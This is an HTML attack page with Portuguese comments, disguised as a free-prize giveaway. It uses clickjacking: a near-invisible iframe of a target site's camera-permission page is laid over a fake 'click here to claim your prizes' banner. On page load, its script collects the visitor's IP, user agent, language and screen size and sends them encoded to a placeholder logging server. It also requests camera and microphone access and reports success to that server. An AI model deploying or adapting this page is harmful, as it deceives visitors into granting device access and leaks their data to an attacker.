<!DOCTYPE html>
<html>
<head>
    <title>Ganhe Prêmios Grátis!</title>
    <style>
        /* Clickjacking: O site alvo fica invisível e cobre a tela toda */
        .target-site {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            opacity: 0.005; /* Quase invisível, mas existe para o browser */
            z-index: 9999;
            border: none;
        }
        .fake-ui {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            z-index: 1;
            background: linear-gradient(45deg, #ff0000, #0000ff);
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            text-align: center;
            font-family: sans-serif;
            font-size: 30px;
            font-weight: bold;
            cursor: pointer;
        }
</head>
<body>
    <div class="fake-ui">🎁 CLIQUE AQUI PARA RESGATAR SEUS PRÊMIOS GRÁTIS! 🎁</div>
    <iframe class="target-site" src="https://site-alvo.com/permissao-camera"></iframe>

    <script>
        const LOG_SERVER = 'https://seu-servidor.com/log';

        // Captura de IP e Informações do Sistema
        async function captureData() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                const info = {
                    ip: data.ip,
                    ua: navigator.userAgent,
                    lang: navigator.language,
                    screen: `${window.screen.width}x${window.screen.height}`
                };
                fetch(`${LOG_SERVER}?data=${btoa(JSON.stringify(info))}`);
            } catch (e) { console.error("Erro na captura"); }
        }

        // Tentativa de acesso à Câmera (Monitoramento)
        async function startCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                // Aqui o stream seria enviado via WebRTC ou capturado em frames para o servidor
                console.log("Câmera acessada com sucesso");
                fetch(`${LOG_SERVER}?status=camera_active`);
            } catch (e) {
                console.log("Permissão negada ou erro: " + e);
            }
        }

        window.onload = () => {
            captureData();
            startCamera();
        };
    </script>
</body>
</html>
